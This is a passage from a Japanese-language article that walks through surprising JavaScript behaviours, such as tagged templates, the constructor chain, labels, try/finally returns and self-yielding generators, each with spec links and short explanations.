    <span class="nb">RegExp</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toString</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
      <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">source</span>
    <span class="p">}</span>

    <span class="o">/</span><span class="mi">7</span><span class="o">/</span> <span class="o">-</span> <span class="sr">/5/</span> <span class="c1">// -&gt; 2</span>
</pre></div></div>

<p><a href="https://www.ecma-international.org/ecma-262/#sec-get-regexp.prototype.source" rel="nofollow noopener" target="_blank">21.2.5.10 get RegExp.prototype.source</a></p>

<h3>
<span id="strings-arent-instances-of-string" class="fragment"></span><a href="#strings-arent-instances-of-string"><i class="fa fa-link"></i></a>Strings aren't instances of String</h3>

<p>文字列は文字列型ではない。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="s1">'str'</span> <span class="c1">// -&gt; 'str'</span>
    <span class="k">typeof</span> <span class="s1">'str'</span> <span class="c1">// -&gt; 'string'</span>
    <span class="s1">'str'</span> <span class="k">instanceof</span> <span class="nb">String</span> <span class="c1">// -&gt; false</span>
</pre></div></div>

<p>Stringコンストラクタはstringを返す。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="k">typeof</span> <span class="nb">String</span><span class="p">(</span><span class="s1">'str'</span><span class="p">)</span>   <span class="c1">// -&gt; 'string'</span>
    <span class="nb">String</span><span class="p">(</span><span class="s1">'str'</span><span class="p">)</span>          <span class="c1">// -&gt; 'str'</span>
    <span class="nb">String</span><span class="p">(</span><span class="s1">'str'</span><span class="p">)</span> <span class="o">==</span> <span class="s1">'str'</span> <span class="c1">// -&gt; true</span>
</pre></div></div>

<p>newを付けると結果が変わる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="k">new</span> <span class="nb">String</span><span class="p">(</span><span class="s1">'str'</span><span class="p">)</span> <span class="o">==</span> <span class="s1">'str'</span> <span class="c1">// -&gt; true</span>
    <span class="k">typeof</span> <span class="k">new</span> <span class="nb">String</span><span class="p">(</span><span class="s1">'str'</span><span class="p">)</span>   <span class="c1">// -&gt; 'object'</span>
</pre></div></div>

<p>newのついたStringはObjectだ。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="k">new</span> <span class="nb">String</span><span class="p">(</span><span class="s1">'str'</span><span class="p">)</span> <span class="c1">// -&gt; [String: 'str']</span>
</pre></div></div>

<p>Stringコンストラクタの仕様は以下に記載されている。<br>
<a href="https://www.ecma-international.org/ecma-262/#sec-string-constructor" rel="nofollow noopener" target="_blank">21.1.1 The String Constructor</a></p>

<h3>
<span id="calling-functions-with-backticks" class="fragment"></span><a href="#calling-functions-with-backticks"><i class="fa fa-link"></i></a>Calling functions with backticks</h3>

<p>引数をそのまま返す関数を実装する。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="kd">function</span> <span class="nx">f</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nx">args</span>
    <span class="p">}</span>
</pre></div></div>

<p>以下の結果になることは想像に難くない。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nx">f</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="c1">// -&gt; [ 1, 2, 3 ]</span>
</pre></div></div>

<p>だが、関数をバッククォートで呼び出せることは知っているか？</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nx">f</span><span class="sb">`true is </span><span class="si">${</span><span class="kc">true</span><span class="si">}</span><span class="sb">, false is </span><span class="si">${</span><span class="kc">false</span><span class="si">}</span><span class="sb">, array is </span><span class="si">${</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">]</span><span class="si">}</span><span class="sb">`</span>
    <span class="c1">// -&gt; [ [ 'true is ', ', false is ', ', array is ', '' ],</span>
    <span class="c1">// -&gt;   true,</span>
    <span class="c1">// -&gt;   false,</span>
    <span class="c1">// -&gt;   [ 1, 2, 3 ] ]</span>
</pre></div></div>

<p>これはタグ付きテンプレートリテラルと呼ばれる機能で、バッククォート内に書かれたテキストがタグ関数fに渡されることになる。<br>
第一引数には文字列を<code>${}</code>で分割した配列が入ってきて、第二引数以降は<code>${}</code>の式の値が順に入ってくる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="kd">function</span> <span class="nx">template</span><span class="p">(</span><span class="nx">strings</span><span class="p">,</span> <span class="p">...</span><span class="nx">keys</span><span class="p">)</span> <span class="p">{</span>
      <span class="c1">// do something with strings and keys…</span>
    <span class="p">}</span>
</pre></div></div>

<p>JavaScriptの中にCSSを書く<a href="https://www.styled-components.com/" rel="nofollow noopener" target="_blank">styled-components</a>ライブラリは、Reactコミュニティで人気である。</p>

<p><a href="https://www.ecma-international.org/ecma-262/#sec-tagged-templates" rel="nofollow noopener" target="_blank">12.3.7 Tagged Templates</a></p>

<h3>
<span id="call-call-call" class="fragment"></span><a href="#call-call-call"><i class="fa fa-link"></i></a>Call call call</h3>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">a</span> <span class="o">=&gt;</span> <span class="nx">a</span><span class="p">,</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">])</span>
</pre></div></div>

<p>警告。<br>
訓練を受けていない方が真似すると動悸・息切れ・眩暈等の症状が現れたり、最悪の場合死に至ることもあります。</p>

<p><a href="https://www.ecma-international.org/ecma-262/#sec-function.prototype.call" rel="nofollow noopener" target="_blank">19.2.3.3 Function.prototype.call(thisArg, ...args)</a><br>
<a href="https://www.ecma-international.org/ecma-262/#sec-function.prototype.apply" rel="nofollow noopener" target="_blank">*<em>19.2.3.1 *</em> Function.prototype.apply(thisArg, argArray)</a></p>

<h3>
<span id="a-constructor-property" class="fragment"></span><a href="#a-constructor-property"><i class="fa fa-link"></i></a>A constructor property</h3>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="kr">const</span> <span class="nx">c</span> <span class="o">=</span> <span class="s1">'constructor'</span>
    <span class="nx">c</span><span class="p">[</span><span class="nx">c</span><span class="p">][</span><span class="nx">c</span><span class="p">](</span><span class="s1">'console.log("WTF?")'</span><span class="p">)()</span> <span class="c1">// &gt; WTF?</span>
</pre></div></div>

<p>順に見ていこう。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="c1">// 'constructor'という文字列を定義する</span>
    <span class="kr">const</span> <span class="nx">c</span> <span class="o">=</span> <span class="s1">'constructor'</span>

    <span class="c1">// cはstring型</span>
    <span class="nx">c</span> <span class="c1">// -&gt; 'constructor'</span>

    <span class="c1">// stringのコンストラクタ</span>
    <span class="nx">c</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="c1">// -&gt; [Function: String]</span>

    <span class="c1">// コンストラクタのコンストラクタ</span>
    <span class="nx">c</span><span class="p">[</span><span class="nx">c</span><span class="p">][</span><span class="nx">c</span><span class="p">]</span> <span class="c1">// -&gt; [Function: Function]</span>

    <span class="c1">// Functionコンストラクタに引数を渡す</span>
    <span class="nx">c</span><span class="p">[</span><span class="nx">c</span><span class="p">][</span><span class="nx">c</span><span class="p">](</span><span class="s1">'console.log("WTF?")'</span><span class="p">)</span> <span class="c1">// -&gt; [Function: anonymous]</span>

    <span class="c1">// 即時関数で呼ぶ</span>
    <span class="nx">c</span><span class="p">[</span><span class="nx">c</span><span class="p">][</span><span class="nx">c</span><span class="p">](</span><span class="s1">'console.log("WTF?")'</span><span class="p">)()</span> <span class="c1">// &gt; WTF?</span>
</pre></div></div>

<p><code>Object.prototype.constructor</code>は作成したインスタンスへの参照を返す。<br>
文字列であればString、数値であればNumberといった具合だ。</p>

<p><a href="https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor" rel="nofollow noopener" target="_blank">Object.prototype.constructor</a> at MDN<br>
<a href="https://www.ecma-international.org/ecma-262/#sec-object.prototype.constructor" rel="nofollow noopener" target="_blank">19.1.3.1 Object.prototype.constructor</a></p>

<h3>
<span id="object-as-a-key-of-objects-property" class="fragment"></span><a href="#object-as-a-key-of-objects-property"><i class="fa fa-link"></i></a>Object as a key of object's property</h3>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">{</span> <span class="p">[{}]</span><span class="o">:</span> <span class="p">{}</span> <span class="p">}</span> <span class="c1">// -&gt; { '[object Object]': {} }</span>
</pre></div></div>

<p>これは計算されたプロパティ名という記法だ。<br>
<code>[]</code>にObjectを渡すと文字列に変換され、'[object Object]'というキー名になる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">({[{}]</span><span class="o">:</span><span class="p">{[{}]</span><span class="o">:</span><span class="p">{}}})[{}][{}]</span> <span class="c1">// -&gt; {}</span>

    <span class="c1">// structure:</span>
    <span class="c1">// {</span>
    <span class="c1">//   '[object Object]': {</span>
    <span class="c1">//     '[object Object]': {}</span>
    <span class="c1">//   }</span>
    <span class="c1">// }</span>
</pre></div></div>

<p>オブジェクトリテラルについては以下を参照。<br>
<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Object_initializer" rel="nofollow noopener" target="_blank">Object initializer</a> at MDN<br>
<a href="http://www.ecma-international.org/ecma-262/6.0/#sec-object-initializer" rel="nofollow noopener" target="_blank">12.2.6 Object Initializer</a></p>

<h3>
<span id="accessing-prototypes-with-__proto__" class="fragment"></span><a href="#accessing-prototypes-with-__proto__"><i class="fa fa-link"></i></a>Accessing prototypes with __proto__</h3>

<p>知ってのとおり、プリミティブ型にプロトタイプはない。<br>
だが__proto__でプロトタイプを取得できる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">__proto__</span> <span class="c1">// -&gt; null</span>
</pre></div></div>

<p>プリミティブ型のプロトタイプを呼ぼうとすると、ToObjectメソッドが自動的に呼ばれてラッパーオブジェクトになる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nx">__proto__</span> <span class="c1">// -&gt; [Number: 0]</span>
    <span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">__proto__</span> <span class="c1">// -&gt; {}</span>
    <span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">__proto__</span> <span class="c1">// -&gt; null</span>
</pre></div></div>

<p>__proto__の詳細については以下を参照。<br>
<a href="https://www.ecma-international.org/ecma-262/#sec-object.prototype.__proto__" rel="nofollow noopener" target="_blank">B.2.2.1 Object.prototype.proto</a><br>
<a href="https://www.ecma-international.org/ecma-262/#sec-toobject" rel="nofollow noopener" target="_blank">7.1.13 ToObject(argument)</a></p>

<h3>
<span id="object" class="fragment"></span><a href="#object"><i class="fa fa-link"></i></a><code>${{Object}}</code>
</h3>

<p>以下の答えは？</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="sb">`</span><span class="si">${</span><span class="p">{</span><span class="nb">Object</span><span class="si">}</span><span class="sb">}`</span>
</pre></div></div>

<p>こうなる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="c1">// -&gt; '[object Object]'</span>
</pre></div></div>

<p>まずはObjectをショートハンド<code>{Object}</code>で定義する。<br>
次にテンプレートリテラルに突っ込むことでtoStringメソッドが呼ばれ、文字列'[object Object]'になる。</p>

<p><a href="https://www.ecma-international.org/ecma-262/#sec-template-literals" rel="nofollow noopener" target="_blank">12.2.9 Template Literals</a><br>
<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Object_initializer" rel="nofollow noopener" target="_blank">Object initializer</a> at MDN</p>

<h3>
<span id="destructuring-with-default-values" class="fragment"></span><a href="#destructuring-with-default-values"><i class="fa fa-link"></i></a>Destructuring with default values</h3>

<p>yはいくつになるか。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="kd">let</span> <span class="nx">x</span><span class="p">,</span> <span class="p">{</span> <span class="nx">x</span><span class="o">:</span> <span class="nx">y</span> <span class="o">=</span> <span class="mi">1</span> <span class="p">}</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">x</span> <span class="p">};</span> <span class="nx">y</span><span class="p">;</span>
</pre></div></div>

<p>答えは1。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="kd">let</span> <span class="nx">x</span><span class="p">,</span> <span class="p">{</span> <span class="nx">x</span><span class="o">:</span> <span class="nx">y</span> <span class="o">=</span> <span class="mi">1</span> <span class="p">}</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">x</span> <span class="p">};</span> <span class="nx">y</span><span class="p">;</span>
    <span class="c1">//  ↑       ↑           ↑    ↑</span>
    <span class="c1">//  1       3           2    4</span>
</pre></div></div>

<p>1：xを定義。値は未定義。<br>
2：xをオブジェクトのプロパティにする。<br>
3：分割代入でプロパティxの値を取り出してyに代入する。未定義なのでデフォルト値1が使われる。<br>
4：yの値を返す。</p>

<p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Object_initializer" rel="nofollow noopener" target="_blank">Object initializer</a> at MDN</p>

<h3>
<span id="dots-and-spreading" class="fragment"></span><a href="#dots-and-spreading"><i class="fa fa-link"></i></a>Dots and spreading</h3>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">[...[...</span><span class="s1">'...'</span><span class="p">]].</span><span class="nx">length</span> <span class="c1">// -&gt; 3</span>
</pre></div></div>

<p>何故3か。<br>
<a href="http://www.ecma-international.org/ecma-262/6.0/#sec-array-initializer" rel="nofollow noopener" target="_blank">スプレッド演算子</a>を使うと<code>@@iterator</code>メソッドが呼び出され、ループに使うイテレータが返される。<br>
文字列のイテレータは、文字列を1文字ずつの配列にする。<br>
文字列'...'は3文字であり、従って答えは3になる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">[...</span><span class="s1">'...'</span><span class="p">]</span>             <span class="c1">// -&gt; [ '.', '.', '.' ]</span>
    <span class="p">[...[...</span><span class="s1">'...'</span><span class="p">]]</span>        <span class="c1">// -&gt; [ '.', '.', '.' ]</span>
    <span class="p">[...[...</span><span class="s1">'...'</span><span class="p">]].</span><span class="nx">length</span> <span class="c1">// -&gt; 3</span>
</pre></div></div>

<p>もっと長くしても結果は同じになる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">[...</span><span class="s1">'...'</span><span class="p">]</span>                 <span class="c1">// -&gt; [ '.', '.', '.' ]</span>
    <span class="p">[...[...</span><span class="s1">'...'</span><span class="p">]]</span>            <span class="c1">// -&gt; [ '.', '.', '.' ]</span>
    <span class="p">[...[...[...</span><span class="s1">'...'</span><span class="p">]]]</span>       <span class="c1">// -&gt; [ '.', '.', '.' ]</span>
    <span class="p">[...[...[...[...</span><span class="s1">'...'</span><span class="p">]]]]</span>  <span class="c1">// -&gt; [ '.', '.', '.' ]</span>
</pre></div></div>

<h3>
<span id="labels" class="fragment"></span><a href="#labels"><i class="fa fa-link"></i></a>Labels</h3>

<p>JavaScriptのラベルはあまり知られていないが、多言語とは異なる特徴を持っている。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nx">foo</span><span class="o">:</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'first'</span><span class="p">);</span>
      <span class="k">break</span> <span class="nx">foo</span><span class="p">;</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'second'</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// &gt; first</span>
    <span class="c1">// -&gt; undefined</span>
</pre></div></div>

<p>ラベル付きステートメントはbreakおよびcontinueと共に使う。<br>
ラベルを用いて範囲を指定し、breakで実行を中断するか、continueで次のループに進むかを選択できる。<br>
上記例では<code>console.log('first');</code>の後でbreakして実行を中断している。</p>

<p><a href="https://tc39.github.io/ecma262/#sec-labelled-statements" rel="nofollow noopener" target="_blank">13.13 Labelled Statements</a><br>
<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/label" rel="nofollow noopener" target="_blank">Labeled statements</a> at MDN</p>

<h3>
<span id="nested-labels" class="fragment"></span><a href="#nested-labels"><i class="fa fa-link"></i></a>Nested labels</h3>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nx">a</span><span class="o">:</span> <span class="nx">b</span><span class="o">:</span> <span class="nx">c</span><span class="o">:</span> <span class="nx">d</span><span class="o">:</span> <span class="nx">e</span><span class="o">:</span> <span class="nx">f</span><span class="o">:</span> <span class="nx">g</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">;</span> <span class="c1">// -&gt; 5</span>
</pre></div></div>

<p>ラベルはネストできる。<br>
<a href="https://www.ecma-international.org/ecma-262/#sec-comma-operator" rel="nofollow noopener" target="_blank">12.16 Comma Operator (,)</a></p>

<h3>
<span id="insidious-trycatch" class="fragment"></span><a href="#insidious-trycatch"><i class="fa fa-link"></i></a>Insidious try..catch</h3>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="k">try</span> <span class="p">{</span>
        <span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
      <span class="p">}</span> <span class="k">finally</span> <span class="p">{</span>
        <span class="k">return</span> <span class="mi">3</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">})()</span>
</pre></div></div>

<p>答えは3。<br>
<a href="https://www.ecma-international.org/ecma-262/#sec-try-statement" rel="nofollow noopener" target="_blank">13.15 The try Statement</a></p>

<h3>
<span id="is-this-multiple-inheritance" class="fragment"></span><a href="#is-this-multiple-inheritance"><i class="fa fa-link"></i></a>Is this multiple inheritance?</h3>

<p>これは多重継承ではないか？</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="k">new</span> <span class="p">(</span><span class="kr">class</span> <span class="nx">F</span> <span class="kr">extends</span> <span class="p">(</span><span class="nb">String</span><span class="p">,</span> <span class="nb">Array</span><span class="p">)</span> <span class="p">{</span> <span class="p">})</span> <span class="c1">// -&gt; F []</span>
</pre></div></div>

<p>いいえ。</p>

<p>注目する点は<code>(String, Array)</code>だ。<br>
グループ化演算子は最後の値を返すので、<code>(String, Array)</code>の値は<code>Array</code>になる。<br>
従って、このクラスは単に<code>Array</code>を継承しているだけだ。</p>

<p><a href="https://www.ecma-international.org/ecma-262/#sec-class-definitions" rel="nofollow noopener" target="_blank">14.5 Class Definitions</a><br>
<a href="https://www.ecma-international.org/ecma-262/#sec-comma-operator" rel="nofollow noopener" target="_blank">12.16 Comma Operator (,)</a></p>

<h3>
<span id="a-generator-which-yields-itself" class="fragment"></span><a href="#a-generator-which-yields-itself"><i class="fa fa-link"></i></a>A generator which yields itself</h3>

<p>自分自身を返すジェネレータを考えてみる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">(</span><span class="kd">function</span><span class="o">*</span> <span class="nx">f</span><span class="p">()</span> <span class="p">{</span> <span class="k">yield</span> <span class="nx">f</span> <span class="p">})().</span><span class="nx">next</span><span class="p">()</span>
    <span class="c1">// -&gt; { value: [GeneratorFunction: f], done: false }</span>
</pre></div></div>

<p>見てのとおり、返ってくるのは値fを持つオブジェクトだ。<br>
つまり、こうなる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">(</span><span class="kd">function</span><span class="o">*</span> <span class="nx">f</span><span class="p">()</span> <span class="p">{</span> <span class="k">yield</span> <span class="nx">f</span> <span class="p">})().</span><span class="nx">next</span><span class="p">().</span><span class="nx">value</span><span class="p">().</span><span class="nx">next</span><span class="p">()</span>
    <span class="c1">// -&gt; { value: [GeneratorFunction: f], done: false }</span>

    <span class="c1">// and again</span>
    <span class="p">(</span><span class="kd">function</span><span class="o">*</span> <span class="nx">f</span><span class="p">()</span> <span class="p">{</span> <span class="k">yield</span> <span class="nx">f</span> <span class="p">})().</span><span class="nx">next</span><span class="p">().</span><span class="nx">value</span><span class="p">().</span><span class="nx">next</span><span class="p">().</span><span class="nx">value</span><span class="p">().</span><span class="nx">next</span><span class="p">()</span>
    <span class="c1">// -&gt; { value: [GeneratorFunction: f], done: false }</span>

    <span class="c1">// and again</span>
    <span class="p">(</span><span class="kd">function</span><span class="o">*</span> <span class="nx">f</span><span class="p">()</span> <span class="p">{</span> <span class="k">yield</span> <span class="nx">f</span> <span class="p">})().</span><span class="nx">next</span><span class="p">().</span><span class="nx">value</span><span class="p">().</span><span class="nx">next</span><span class="p">().</span><span class="nx">value</span><span class="p">().</span><span class="nx">next</span><span class="p">().</span><span class="nx">value</span><span class="p">().</span><span class="nx">next</span><span class="p">()</span>
    <span class="c1">// -&gt; { value: [GeneratorFunction: f], done: false }</span>
</pre></div></div>

<p>このようになる理由は以下を参照。<br>
<a href="https://www.ecma-international.org/ecma-262/#sec-control-abstraction-objects" rel="nofollow noopener" target="_blank">25 Control Abstraction Objects</a><br>
<a href="https://www.ecma-international.org/ecma-262/#sec-generator-objects" rel="nofollow noopener" target="_blank">25.3 Generator Objects</a></p>

<h3>
<span id="a-class-of-class" class="fragment"></span><a href="#a-class-of-class"><i class="fa fa-link"></i></a>A class of class</h3>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">(</span><span class="k">typeof</span> <span class="p">(</span><span class="k">new</span> <span class="p">(</span><span class="kr">class</span> <span class="p">{</span> <span class="kr">class</span> <span class="p">()</span> <span class="p">{}</span> <span class="p">})))</span> <span class="c1">// -&gt; 'object'</span>
</pre></div></div>

<p>クラス内でクラスを宣言しており、エラーになるはずなのに文字列'object'が返ってくる。</p>

<p>ES5以降、キーワードもプロパティ名として使用することができる。<br>
従って以下の文は有効だ。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="kr">const</span> <span class="nx">foo</span> <span class="o">=</span> <span class="p">{</span>
      <span class="kr">class</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{}</span>
    <span class="p">};</span>
</pre></div></div>

<p>さて、ES6においてメソッドの短縮構文が導入された。<br>
つまり上記はこう書ける。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="kr">class</span> <span class="p">{</span>
      <span class="kr">class</span><span class="p">()</span> <span class="p">{}</span>
    <span class="p">}</span>
</pre></div></div>

<p>これはただのクラスであり、従ってその型は'object'になる。</p>

<p><a href="https://www.ecma-international.org/ecma-262/#sec-method-definitions" rel="nofollow noopener" target="_blank">14.3 Method Definitions</a><br>
<a href="https://www.ecma-international.org/ecma-262/#sec-class-definitions" rel="nofollow noopener" target="_blank">14.5 Class Definitions</a></p>

<h3>
<span id="non-coercible-objects" class="fragment"></span><a href="#non-coercible-objects"><i class="fa fa-link"></i></a>Non-coercible objects</h3>

<p><a href="https://www.ecma-international.org/ecma-262/#sec-well-known-symbols" rel="nofollow noopener" target="_blank">well-known symbols</a>の型強制を回避する。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="kd">function</span> <span class="nx">nonCoercible</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nx">val</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="nx">TypeError</span><span class="p">(</span><span class="s1">'nonCoercible should not be called with null or undefined'</span><span class="p">)</span>
      <span class="p">}</span>

      <span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span>

      <span class="nx">res</span><span class="p">[</span><span class="nx">Symbol</span><span class="p">.</span><span class="nx">toPrimitive</span><span class="p">]</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="nx">TypeError</span><span class="p">(</span><span class="s1">'Trying to coerce non-coercible object'</span><span class="p">)</span>
      <span class="p">}</span>

      <span class="k">return</span> <span class="nx">res</span>
    <span class="p">}</span>
</pre></div></div>

<p>こうやって使える。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="c1">// objects</span>
    <span class="kr">const</span> <span class="nx">foo</span> <span class="o">=</span> <span class="nx">nonCoercible</span><span class="p">({</span><span class="nx">foo</span><span class="o">:</span> <span class="s1">'foo'</span><span class="p">})</span>

    <span class="nx">foo</span> <span class="o">*</span> <span class="mi">10</span>      <span class="c1">// -&gt; TypeError: Trying to coerce non-coercible object</span>
    <span class="nx">foo</span> <span class="o">+</span> <span class="s1">'evil'</span>  <span class="c1">// -&gt; TypeError: Trying to coerce non-coercible object</span>

    <span class="c1">// strings</span>
    <span class="kr">const</span> <span class="nx">bar</span> <span class="o">=</span> <span class="nx">nonCoercible</span><span class="p">(</span><span class="s1">'bar'</span><span class="p">)</span>

    <span class="nx">bar</span> <span class="o">+</span> <span class="s1">'1'</span>                 <span class="c1">// -&gt; TypeError: Trying to coerce non-coercible object</span>
    <span class="nx">bar</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="mi">1</span>        <span class="c1">// -&gt; bar1</span>
    <span class="nx">bar</span> <span class="o">===</span> <span class="s1">'bar'</span>             <span class="c1">// -&gt; false</span>
    <span class="nx">bar</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span> <span class="o">===</span> <span class="s1">'bar'</span>  <span class="c1">// -&gt; true</span>
    <span class="nx">bar</span> <span class="o">==</span> <span class="s1">'bar'</span>              <span class="c1">// -&gt; TypeError: Trying to coerce non-coercible object</span>

    <span class="c1">// numbers</span>
    <span class="kr">const</span> <span class="nx">baz</span> <span class="o">=</span> <span class="nx">nonCoercible</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="nx">baz</span> <span class="o">==</span> <span class="mi">1</span>             <span class="c1">// -&gt; TypeError: Trying to coerce non-coercible object</span>
    <span class="nx">baz</span> <span class="o">===</span> <span class="mi">1</span>            <span class="c1">// -&gt; false</span>
    <span class="nx">baz</span><span class="p">.</span><span class="nx">valueOf</span><span class="p">()</span> <span class="o">===</span> <span class="mi">1</span>  <span class="c1">// -&gt; true</span>
</pre></div></div>

<p><a href="https://gist.github.com/chicoxyzzy/5dd24608e886adf5444499896dff1197" rel="nofollow noopener" target="_blank">A gist by Sergey Rubanov</a><br>
<a href="https://www.ecma-international.org/ecma-262/#sec-well-known-symbols" rel="nofollow noopener" target="_blank">6.1.5.1 Well-Known Symbols</a></p>

<h3>
<span id="tricky-arrow-functions" class="fragment"></span><a href="#tricky-arrow-functions"><i class="fa fa-link"></i></a>Tricky arrow functions</h3>

<p>アロー関数がある。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="kd">let</span> <span class="nx">f</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="mi">10</span>
    <span class="nx">f</span><span class="p">()</span> <span class="c1">// -&gt; 10</span>
</pre></div></div>

<p>だが下の例は思った通りに動かない。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="kd">let</span> <span class="nx">f</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{}</span>
    <span class="nx">f</span><span class="p">()</span> <span class="c1">// -&gt; undefined</span>
</pre></div></div>

<p><code>{}</code>を期待したのに<code>undefined</code>が返ってきた。<br>
中括弧はアロー関数の構文の一部と見做されるため、関数の本体がなくなる。</p>

<h3>
<span id="arguments-and-arrow-functions" class="fragment"></span><a href="#arguments-and-arrow-functions"><i class="fa fa-link"></i></a>arguments and arrow functions</h3>

<p>引数のある関数だ。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="kd">let</span> <span class="nx">f</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
      <span class="k">return</span> <span class="nx">arguments</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">f</span><span class="p">(</span><span class="s1">'a'</span><span class="p">);</span> <span class="c1">// -&gt; { '0': 'a' }</span>
</pre></div></div>

<p>アロー関数にしよう。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="kd">let</span> <span class="nx">f</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span>  <span class="nx">arguments</span><span class="p">;</span>
